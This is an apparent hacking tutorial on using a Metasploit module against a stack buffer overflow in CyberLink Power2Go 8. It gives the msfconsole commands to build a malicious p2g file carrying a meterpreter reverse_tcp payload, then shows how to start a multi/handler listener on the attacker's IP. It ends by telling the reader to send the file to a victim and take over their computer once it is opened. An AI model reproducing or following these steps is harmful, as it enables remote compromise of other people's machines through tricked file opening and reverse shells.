Hack Windows PC using Cyber Link Power2Go name attribute (p2g) Stack Buffer Overflow Exploit

This module exploits a stack buffer overflow in Cyber Link Power2Go version 8.x the vulnerability is triggered when opening a malformed p2g file containing an overly long string in the ‘name’ attribute of the file element. This results in overwriting a structured exception handler record.
CyberLink Power2Go 8
Attacker: Backtrack 5
Victim PC: Windows 7
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/cyberlink_p2g_bof
msf exploit (cyberlink_p2g_bof)>set payload windows/meterpreter/reverse_tcp
msf exploit (cyberlink_p2g_bof)>set lhost 192.168.1.2 (IP of Local Host)
msf exploit (cyberlink_p2g_bof)>exploit

After we successfully generate the malicious p2g File, it will stored on your local computer
/root/.msf4/local/msf.p2g

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.2
exploit
Now send your msf.p2g files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
